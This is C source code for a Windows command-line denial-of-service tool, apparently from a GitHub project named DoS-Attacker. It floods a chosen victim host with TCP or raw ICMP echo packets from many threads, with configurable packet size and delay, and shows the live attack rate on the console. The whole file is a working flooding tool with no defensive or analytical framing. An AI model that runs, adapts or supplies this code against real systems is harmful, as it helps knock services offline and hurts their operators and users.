#include <stdio.h>
#include <stdlib.h>
#include <WinSock2.h>
#include <ws2tcpip.h>
#include <Windows.h>
#include <iphlpapi.h>
#include <conio.h>
#include <time.h>
#include <stdint.h>

#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")
#pragma comment (lib, "IPHLPAPI.lib")
#pragma warning (disable : 4244)
#pragma warning (disable : 4267)
#pragma warning (disable : 6385)
#pragma warning (disable : 6386)

//structures
struct DoSInfo
{
	char* victim;
	char* service;
	addrinfo* hint;
	void* pkt;
	DWORD pkt_size, delay;
};

struct ICMP_Pkt
{
	uint8_t type;
	uint8_t code;
	uint16_t checksum,id,sequence;
};

//functions
void ErrChk(int code, const char* func)
{
	if (code == SOCKET_ERROR)
	{
		printf("Error %u in function %s\n", WSAGetLastError(), func);
		exit(-1);
	}
}

void cls(HANDLE hConsole)
{
	COORD coordScreen = { 0, 0 }; // home for the cursor 
	DWORD cCharsWritten;
	CONSOLE_SCREEN_BUFFER_INFO csbi;
	DWORD dwConSize;

	// Get the number of character cells in the current buffer. 

	if (!GetConsoleScreenBufferInfo(hConsole, &csbi))
	{
		return;
	}

	dwConSize = csbi.dwSize.X * csbi.dwSize.Y;

	// Fill the entire screen with blanks.

	if (!FillConsoleOutputCharacter(hConsole,        // Handle to console screen buffer 
		(TCHAR) ' ',     // Character to write to the buffer
		dwConSize,       // Number of cells to write 
		coordScreen,     // Coordinates of first cell 
		&cCharsWritten))// Receive number of characters written
	{
		return;
	}

	// Get the current text attribute.

	if (!GetConsoleScreenBufferInfo(hConsole, &csbi))
	{
		return;
	}

	// Set the buffer's attributes accordingly.

	if (!FillConsoleOutputAttribute(hConsole,         // Handle to console screen buffer 
		csbi.wAttributes, // Character attributes to use
		dwConSize,        // Number of cells to set attribute 
		coordScreen,      // Coordinates of first cell 
		&cCharsWritten)) // Receive number of characters written
	{
		return;
	}

	// Put the cursor at its home coordinates.

	SetConsoleCursorPosition(hConsole, coordScreen);
}

uint16_t calc_chksum(const ICMP_Pkt* data, size_t len)
{
	uint16_t sum = 0;
	const uint8_t* ptr = (uint8_t*)data;
	//we sum all the data
	for (size_t l = 0; l < len; l += 2)
		sum += MAKEWORD(ptr[l++], (l + 1 < len) ? ptr[l++] : 0);
	//then not-ing it and parsing it into little endian.
	return htons(~sum);
}

//global vars for threads
static size_t data = 0, pings = 0;
static UINT exit_code = -1;
static bool run = true, start = false, change_pkt = false;

DWORD WINAPI DoSThread(LPVOID lParam)
{
	const DoSInfo* info = (DoSInfo*)lParam;
	DWORD res = 0, max_pkt_size = 65536;
	int res_size=sizeof(DWORD);
	long long sent = 0;
	bool keepaliveb = true;
	SOCKET sock = INVALID_SOCKET;
	addrinfo* result;

	//get the information
	if (getaddrinfo(info->victim, info->service, info->hint, &result))
	{
		printf("An error %u occord in getaddrinfo.\nCheck https://docs.microsoft.com/he-il/windows/win32/winsock/windows-sockets-error-codes-2 for more information.\n", WSAGetLastError());
		run = false;
		exit(-1);
	}
	//connect
	for (addrinfo* ptr = result; ptr != NULL; ptr = ptr->ai_next)
	{
		sock = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
		if (sock == INVALID_SOCKET)
		{
			puts("Error in creating socket.");
			return -1;
		}
		if (connect(sock, ptr->ai_addr, ptr->ai_addrlen) == SOCKET_ERROR)
		{
			closesocket(sock);
			sock = INVALID_SOCKET;
			continue;
		}
		break;
	}

	if (sock == INVALID_SOCKET)
	{
		puts("Unable to connect to the server.");
		run = false;
		exit(-1);
	}

	//set
	ErrChk(getsockopt(sock, SOL_SOCKET, SO_SNDBUF, (char*)& max_pkt_size, &res_size), "getsockopt");
	if (info->pkt_size > max_pkt_size && max_pkt_size)
	{
		printf("The packet size that you have chose is too big...\nThe sockets of this type have a limit of %llu bytes.\n", (unsigned long long)max_pkt_size);
		run = false;
		exit(-1);
	}
	ErrChk(setsockopt(sock, SOL_SOCKET, SO_SNDBUF, (char*) & (info->pkt_size), sizeof(DWORD)), "setsockopt");
	ErrChk(setsockopt(sock, SOL_SOCKET, SO_RCVBUF, (char*) & (info->pkt_size), sizeof(DWORD)), "setsockopt");
	//wait...
	while (!start)Sleep(10);//We use Sleep to keep the CPU usage low. If we won't use it, the CPU will probably be at 100%
	//attack!
	ICMP_Pkt* i = (ICMP_Pkt*)malloc(info->pkt_size);
	if (!i)exit(-1);
	while (run)
	{
		sent = send(sock, (char*)info->pkt, info->pkt_size, 0);
		//Sometimes the victim replies (super rare). Here we just read those packets from the victim.
		recv(sock, (char*)i, info->pkt_size, MSG_WAITALL);
		pings++;
		if (sent <= 0)
		{
			res = WSAGetLastError();
			switch (res)
			{
			case WSAECONNABORTED:
				puts("\nA WSAECONNABORTED error has occord.\nA software in your PC has closed the connection, or maybe the timeout passed.");
				break;
			case WSAECONNRESET:
				puts("\nA WSAECONNRESET error has occord.\nThe remote host has closed the connection or maybe you can't acess it.");
				break;
			case WSAECONNREFUSED:
				puts("\nA WSAECONNREFUSED error has occord.\nThe remote host refused to the connection.");
				break;
			case WSAENOBUFS:
				//we just need to wait... the buffer will be empty...
				Sleep(info->delay);
				continue;
			default:
				printf("\nError \'%u\' has occord.\nCheck https://docs.microsoft.com/he-il/windows/win32/winsock/windows-sockets-error-codes-2 for specific error information.", res);
			}
			run = false;
			exit(-1);
		}
		//we add sent to data after the error check just to make sure that sent is valid (not -1)
		data += sent;
		//sleep between packets
		if (info->delay)
			Sleep(info->delay);
	}
	//we must clean at the end
	closesocket(sock);
	return 0;
}

DWORD WINAPI SpeedThread(LPVOID lParam)
{
	HANDLE outh = GetStdHandle(STD_OUTPUT_HANDLE);
	//wait...
	while (!start)Sleep(10);//We use Sleep to keep the CPU usage low. If we won't use it, the CPU will probably be at 100%
	//monitor the attack
	while (run)
	{
		Sleep(1000);
		cls(outh);
		//print the speed
		printf("Attacking: %s\nSpeed rate: %.2fMbps or %.3fMBps\nPings rate: %llu\nPress CTRL+C to stop.", (char*)lParam, (double)data * 8 / 1024 / 1024, (double)data / 1024 / 1024, pings);
		data = 0;
		pings = 0;
	}
	return 0;
}

#define HELPMSG puts("Check https://github.com/SKC-Developer/DoS-Attacker.git for usage.")

int main(int argc, char** argv)
{
	//Dos_Attacker victim /port port OR /icmp __nothing__ packet_size threads delay

	BYTE* buff = NULL;
	addrinfo hint = { 0 }, * result = NULL;
	WSADATA wsa;
	DWORD delay = 0, pkt_size = 1, max_pkt_size = SO_MAX_MSG_SIZE;
	int res_size=sizeof(DWORD);
	size_t threads_num = 2;
	HANDLE* threads;
	char* port = NULL;
	bool mode_tcp = true;


	if (argc < 4)
	{
		HELPMSG;
		return 0;
	}

	if (strcmp("/port", argv[2]) == 0 || strcmp("-port", argv[2]) == 0 || strcmp("port", argv[2]) == 0)
	{
		hint.ai_family = AF_UNSPEC;
		hint.ai_socktype = SOCK_STREAM;
		hint.ai_protocol = IPPROTO_TCP;
		if (argc != 7)
		{
			HELPMSG;
			return 0;
		}
	}
	else if (strcmp("/icmp", argv[2]) == 0 || strcmp("-icmp", argv[2]) == 0 || strcmp("icmp", argv[2]) == 0)
	{
		hint.ai_family = AF_UNSPEC;
		hint.ai_socktype = SOCK_RAW;
		hint.ai_protocol = IPPROTO_ICMP;
		mode_tcp = false;
		if (argc != 6)
		{
			HELPMSG;
			return 0;
		}
	}
	else
	{
		HELPMSG;
		return 0;
	}

	if (mode_tcp)port = argv[3];
	pkt_size = strtoul(argv[3 + mode_tcp], NULL, 10);
	if (pkt_size <= 0 || (mode_tcp == false && pkt_size < sizeof(ICMP_Pkt)))
	{
		puts("Invalid packet size.\nThe packet size must be nonzero.\n");
		return -1;
	}

	ErrChk(WSAStartup(MAKEWORD(2, 2), &wsa), "WSAStartup");
	
	buff = (BYTE*)malloc(pkt_size);
	if (!buff)
	{
		puts("Allocation error.");
		return -1;
	}
	for (size_t l = (mode_tcp) ? 0 : sizeof(ICMP_Pkt); l < pkt_size; l++)
		buff[l] = 0;

	if(!mode_tcp)
	{
		ICMP_Pkt* ipkt = (ICMP_Pkt*)buff;
		ZeroMemory(ipkt, sizeof(ICMP_Pkt));
		if (ipkt == NULL)
		{
			puts("Allocation error.");
			return -1;
		}
		//set the packet
		ipkt->type = 8;
		ipkt->code = 0;
		ipkt->sequence = 0;
		ipkt->id = GetCurrentProcessId();
		ipkt->checksum = 0;
		ipkt->checksum = calc_chksum(ipkt, pkt_size);
	}

	threads_num = strtoull(argv[4 + mode_tcp], NULL, 10);
	if (!threads_num)
	{
		puts("Invalid threads number.\nThreads number must be nonzero.");
		return -1;
	}
	threads = (HANDLE*)malloc((threads_num + 1) * sizeof(HANDLE));
	if (!threads)
	{
		puts("Allocation error.");
		return -1;
	}

	delay = strtoul(argv[5 + mode_tcp], NULL, 10);

	printf("You have chose to attack \'%s:%s\' with a packet size of %llu, a total of %llu threads (and sockets) and a delay of %llu between packets.\nContinue? ", argv[1], (mode_tcp) ? port : "ICMP", (unsigned long long)pkt_size, threads_num, (unsigned long long)delay);
	if (getchar() != 'y')return -1;

	//set the args for the threads
	DoSInfo info = { argv[1], (mode_tcp) ? port : NULL, &hint, buff, pkt_size, delay };
	start = false;
	//create the monitoring thread
	threads[0] = CreateThread(NULL, 0, SpeedThread, argv[1], 0, NULL);
	//create the attack threads
	for (size_t l = 1; l < threads_num+1; l++)
	{
		threads[l] = CreateThread(NULL, 0, DoSThread, &info, 0, NULL);
		printf("\r%llu threads have been created.", l);
		if (threads[l] == INVALID_HANDLE_VALUE)
		{
			puts("Error in creating threads...");
			return -1;
		}
	}
	start = true;
	//wait for the CTRL+C
	MSG msg;
	while (GetMessage(&msg,NULL,NULL,NULL))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	//close all the threads
	run = false;
	//wait for the cleanup of the threads
	Sleep(1000);
	//clean up
	WSACleanup();

	return 0;
}